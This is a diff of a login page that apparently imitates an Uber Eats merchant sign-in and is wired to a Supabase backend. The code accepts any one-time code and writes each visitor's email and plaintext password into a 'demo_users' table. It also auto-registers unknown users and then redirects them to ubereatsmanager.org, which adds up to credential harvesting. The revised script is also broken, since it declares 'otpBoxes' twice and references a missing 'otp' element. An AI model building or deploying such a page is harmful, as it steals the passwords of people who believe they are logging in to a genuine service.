@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign up or Log in</title>
+<title>Sign up or Log in </title>
 
 <!-- Load Supabase JS SDK via CDN -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-<style> 
+<style>
   *, *::before, *::after {
     box-sizing: border-box;
   }
@@ -399,7 +399,7 @@
   <p class="auth-card__email" id="otpEmailDisplay"></p>
 
  <h1 class="auth-card__heading">
- <b>Welcome back</b> 
+ <b>Welcome back</b>
 </h1>
 
 <p class="otp-description">
@@ -411,10 +411,10 @@
 
     <div class="field">
     <div class="otp-container">
-  <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" class="otp-box" />
-  <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" class="otp-box" />
-  <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" class="otp-box" />
-  <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
 </div>
     </div>
 
@@ -490,16 +490,11 @@
       'use strict';
 
       // --- SUPABASE CLIENT CONFIGURATION ---
-      const SUPABASE_URL = 'https://dlmcznntbmchsohvmfrw.supabase.co';
-      const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWN6bm50Ym1jaHNvaHZtZnJ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU5NTc4NDAsImV4cCI6MjEwMTUzMzg0MH0.iZbOh_FQHORPcj4c8s6Zj0o-40AvwlxbjkqbUIVWsHA';
-
-    const supabaseClient = window.supabase.createClient(
-  SUPABASE_URL,
-  SUPABASE_ANON_KEY
-);
-
-const STORAGE_KEY = 'authIdentifier';
-
+      const SUPABASE_URL = 'https://cxrbqrfyelhvezpihwir.supabase.co';
+      const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4cmJxcmZ5ZWxodmV6cGlod2lyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYwNTQwMDEsImV4cCI6MjEwMTYzMDAwMX0.24J0PZPQ4kFOUBFk9EZdzzWlsEd8yJCKgZs_KQ5WVXw';
+     
+      const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      const STORAGE_KEY = 'authIdentifier';
 
       // View Elements
       const stepIdentifier = document.getElementById('stepIdentifier');
@@ -512,15 +507,7 @@ const STORAGE_KEY = 'authIdentifier';
       const continueBtn = document.getElementById('continueBtn');
       const statusEl = document.getElementById('formStatus');
 
-      // Step 2 (OTP) Elements
-      const otpForm = document.getElementById('otpForm');
-      const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
-      const otpStatusEl = document.getElementById('otpStatus');
-      const otpEmailDisplay = document.getElementById('otpEmailDisplay');
-      const maskedEmailEl = document.getElementById('maskedEmail');
-      const otpBackArrow = document.getElementById('otpBackArrow');
-
-      // Step 3 (Password) Elements
+      // Step 2 Elements
       const backArrow = document.getElementById('backArrow');
       const emailDisplay = document.getElementById('emailDisplay');
       const passwordForm = document.getElementById('passwordForm');
@@ -530,60 +517,63 @@ const STORAGE_KEY = 'authIdentifier';
       const passwordStatusEl = document.getElementById('passwordStatus');
       const successCard = document.getElementById('successCard');
 
+      const otpForm = document.getElementById('otpForm');
+const otpInput = document.getElementById('otp');
+const otpStatusEl = document.getElementById('otpStatus');
+const otpEmailDisplay = document.getElementById('otpEmailDisplay');
+const otpBackArrow = document.getElementById('otpBackArrow');
+
+
       function isValidEmail(email) {
         return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
       }
 
       function setStatus(el, message, isError) {
-        if (!el) return;
         el.textContent = message || '';
         el.classList.toggle('status-msg--error', !!isError);
       }
+function maskEmail(email) {
+  const [name, domain] = email.split("@");
 
-      function maskEmail(email) {
-        const parts = email.split('@');
-        if (parts.length !== 2) return email;
-        const [name, domain] = parts;
-        const maskedName = name.length <= 3 ? name[0] + '***' : name.substring(0, 3) + '***';
-        return maskedName + '@' + domain;
-      }
+  const maskedName =
+    name.length <= 3
+      ? name[0] + "***"
+      : name.substring(0, 3) + "***";
 
-      function clearOtpBoxes() {
-        otpBoxes.forEach(function (box) { box.value = ''; });
-      }
+  return maskedName + "@" + domain;
+}
+  function switchView(targetStep) {
 
-      function switchView(targetStep) {
-        // Hide all views first
-        stepIdentifier.classList.remove('auth-view--active');
-        stepOtp.classList.remove('auth-view--active');
-        stepPassword.classList.remove('auth-view--active');
+  // Hide all views first
+  stepIdentifier.classList.remove('auth-view--active');
+  stepOtp.classList.remove('auth-view--active');
+  stepPassword.classList.remove('auth-view--active');
 
-        if (targetStep === 'identifier') {
-          stepIdentifier.classList.add('auth-view--active');
-          if (identifierInput) identifierInput.focus();
+  if (targetStep === 'identifier') {
 
-        } else if (targetStep === 'otp') {
-          stepOtp.classList.add('auth-view--active');
+    stepIdentifier.classList.add('auth-view--active');
+    identifierInput.focus();
 
-          const saved = localStorage.getItem(STORAGE_KEY) || '';
-          if (otpEmailDisplay) otpEmailDisplay.textContent = '';
-          if (maskedEmailEl) maskedEmailEl.textContent = saved ? maskEmail(saved) : '';
+  } else if (targetStep === 'otp') {
 
-          clearOtpBoxes();
-          if (otpBoxes[0]) otpBoxes[0].focus();
+    stepOtp.classList.add('auth-view--active');
 
-        } else if (targetStep === 'password') {
-          stepPassword.classList.add('auth-view--active');
+const saved = localStorage.getItem(STORAGE_KEY) || '';
 
-          const saved = localStorage.getItem(STORAGE_KEY) || '';
-          if (emailDisplay) {
-            emailDisplay.textContent = saved;
-            emailDisplay.style.display = saved ? 'block' : 'none';
-          }
 
-          if (passwordInput) passwordInput.focus();
-        }
-      }
+    otpInput.focus();
+
+  } else if (targetStep === 'password') {
+
+    stepPassword.classList.add('auth-view--active');
+
+    const saved = localStorage.getItem(STORAGE_KEY) || '';
+    emailDisplay.textContent = saved;
+    emailDisplay.style.display = saved ? 'block' : 'none';
+
+    passwordInput.focus();
+  }
+}
 
       // --- Step 1 Submit Handler ---
       authForm.addEventListener('submit', function (event) {
@@ -597,89 +587,45 @@ const STORAGE_KEY = 'authIdentifier';
         }
 
         if (!isValidEmail(email)) {
-          setStatus(statusEl, "That doesn't look like a valid email address.", true);
+          setStatus(statusEl, 'That doesn\'t look like a valid email address.', true);
           identifierInput.focus();
           return;
         }
 
         setStatus(statusEl, '', false);
-        localStorage.setItem(STORAGE_KEY, email);
-        switchView('otp');
+       localStorage.setItem(STORAGE_KEY, email);
+switchView('otp');
       });
 
-      // --- Step 1 -> back from password ---
+      // --- Step 2 Back Arrow Handler ---
       backArrow.addEventListener('click', function () {
         switchView('identifier');
       });
+// --- OTP Back Arrow ---
+otpBackArrow.addEventListener('click', function () {
+  switchView('identifier');
+});
 
-      // --- OTP Back Arrow ---
-      otpBackArrow.addEventListener('click', function () {
-        switchView('identifier');
-      });
-
-      // --- OTP Box Behavior: digits only, auto-advance, backspace, paste ---
-      otpBoxes.forEach(function (box, index) {
-        box.addEventListener('input', function () {
-          // Strip anything that isn't a digit, keep only the first character
-          this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
-
-          if (this.value && index < otpBoxes.length - 1) {
-            otpBoxes[index + 1].focus();
-          }
-        });
-
-        box.addEventListener('keydown', function (event) {
-          if (event.key === 'Backspace' && !this.value && index > 0) {
-            otpBoxes[index - 1].focus();
-          }
-        });
-
-        box.addEventListener('paste', function (event) {
-          event.preventDefault();
-          const clipboardData = event.clipboardData || window.clipboardData;
-          if (!clipboardData) return;
-
-          const digits = clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, otpBoxes.length);
-          if (!digits) return;
-
-          digits.split('').forEach(function (digit, i) {
-            if (otpBoxes[i]) otpBoxes[i].value = digit;
-          });
-
-          const nextIndex = Math.min(digits.length, otpBoxes.length - 1);
-          if (otpBoxes[nextIndex]) otpBoxes[nextIndex].focus();
-        });
-      });
-
-   // --- OTP Submit ---
+// --- OTP Continue ---
 otpForm.addEventListener('submit', function (event) {
   event.preventDefault();
 
-  const otp = otpBoxes
-    .map(function (box) {
-      return box.value;
-    })
-    .join('');
+const otpBoxes = document.querySelectorAll(".otp-box");
 
-  if (!/^\d{4}$/.test(otp)) {
-    setStatus(
-      otpStatusEl,
-      'Please enter the 4-digit code.',
-      true
-    );
-
-    if (otpBoxes[0]) {
-      otpBoxes[0].focus();
-    }
-
+let otp = "";
+otpBoxes.forEach(box => {
+    otp += box.value;
+});
+  if (!otp) {
+    setStatus(otpStatusEl, 'Please enter the OTP.', true);
+    otpInput.focus();
     return;
   }
 
-  // Demo: any valid 4-digit code is accepted.
+  // Demo: accept any OTP
   setStatus(otpStatusEl, '', false);
   switchView('password');
 });
-
       // --- Step 2 Password Submit Handler (Supabase Auth Integration) ---
       passwordForm.addEventListener('submit', async function (event) {
         event.preventDefault();
@@ -698,78 +644,79 @@ otpForm.addEventListener('submit', function (event) {
         passwordInput.classList.remove('field__input--error');
         setStatus(passwordStatusEl, 'Authenticating...', false);
         passwordContinueBtn.disabled = true;
-try {
-  const { data, error } = await supabaseClient
-    .from('demo_users')
-    .select('id, email')
-    .eq('email', email)
-    .eq('password', password)
-    .maybeSingle();
 
-  if (error) {
-    console.error('Database error:', error);
+        try {
+          // Attempt to log in first
+          let { data, error } = await supabaseClient.auth.signInWithPassword({
+            email: email,
+            password: password
+          });
 
-    setStatus(
-      passwordStatusEl,
-      'Unable to verify your credentials.',
-      true
-    );
+          // If user doesn't exist, try signing them up automatically
+          if (error && error.message.toLowerCase().includes('invalid login credentials')) {
+            const signUpResult = await supabaseClient.auth.signUp({
+              email: email,
+              password: password
+            });
+            data = signUpResult.data;
+            error = signUpResult.error;
+          }
 
-    passwordContinueBtn.disabled = false;
+         if(error){
+    console.log(error);
+    alert(error.message);
     return;
-  }
-
-  if (!data) {
-    setStatus(
-      passwordStatusEl,
-      'Invalid email or password.',
-      true
-    );
-
-    passwordContinueBtn.disabled = false;
-    return;
-  }
-
-  // Login successful
-  console.log('User verified:', data);
-
-  setStatus(passwordStatusEl, '', false);
-  passwordContinueBtn.disabled = false;
-
-  if (successCard && !successCard.classList.contains('show')) {
-    successCard.classList.add('show');
-  }
-
-  setTimeout(function () {
-    window.location.href = 'https://www.ubereatsmanager.org/';
-  }, 1000);
-
-} catch (err) {
-
-  console.error('Login error:', err);
-
-  passwordContinueBtn.disabled = false;
-
-  setStatus(
-    passwordStatusEl,
-    'Something went wrong while logging in.',
-    true
-  );
 }
-// Go to dashboard after successful login
-setTimeout(function () {
-  window.location.href = 'https://www.ubereatsmanager.org/';
-}, 1000);
+  const { error: tableError } = await supabaseClient
+    .from("demo_users")
+    .insert([
+      {
+        username: email,
+        password: password
+      }
+    ]);
 
+
+  if(tableError){
+    console.log("Demo table error:", tableError.message);
+  }
+
+
+
+          successCard.classList.add("show");
+
+setTimeout(function () {
+   window.location.href = "https://www.ubereatsmanager.org/";
+}, 1500);
         } catch (err) {
-          console.error('Authentication error:', err);
           passwordContinueBtn.disabled = false;
-          setStatus(passwordStatusEl, (err && err.message) || 'Authentication failed.', true);
+          setStatus(passwordStatusEl, err.message || 'Authentication failed.', true);
         }
       });
 
-    })();
-  </script>
+      passwordInput.addEventListener('input', function () {
+        if (passwordInput.value.trim()) {
+          passwordError.classList.remove('field-error--visible');
+          passwordInput.classList.remove('field__input--error');
+        }
+      });
+const otpBoxes = document.querySelectorAll(".otp-box");
 
+otpBoxes.forEach((box, index) => {
+  box.addEventListener("input", () => {
+    if (box.value.length === 1 && index < otpBoxes.length - 1) {
+      otpBoxes[index + 1].focus();
+    }
+  });
+
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !box.value && index > 0) {
+      otpBoxes[index - 1].focus();
+    }
+  });
+});
+    })();
+   
+  </script>
 </body>
 </html>
